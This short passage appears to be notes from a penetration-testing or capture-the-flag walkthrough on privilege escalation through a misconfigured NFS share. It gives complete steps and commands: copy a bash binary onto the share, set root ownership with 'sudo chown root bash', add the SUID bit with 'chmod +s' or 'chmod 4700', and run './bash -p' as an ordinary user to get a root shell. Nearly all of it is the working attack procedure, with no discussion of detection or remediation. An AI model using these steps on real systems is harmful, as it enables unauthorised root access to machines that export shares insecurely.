  
First, change directory to the mount point on your machine, where the NFS share should still be mounted, and then into the user's home directory.

  
Download the bash executable to your Downloads directory. Then use "cp ~/Downloads/bash ." to copy the bash executable to the NFS share. The copied bash shell must be owned by a root user, you can set this using "sudo chown root bash"

How to set SUID permissions to a file

	chmod +s <filename>
	chmod 4700 <executable>

We will set SUID permission to the file in NFS mount and when we run it as normal user 

we will get root shell

commands to run bash

	./bash -p

 -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.
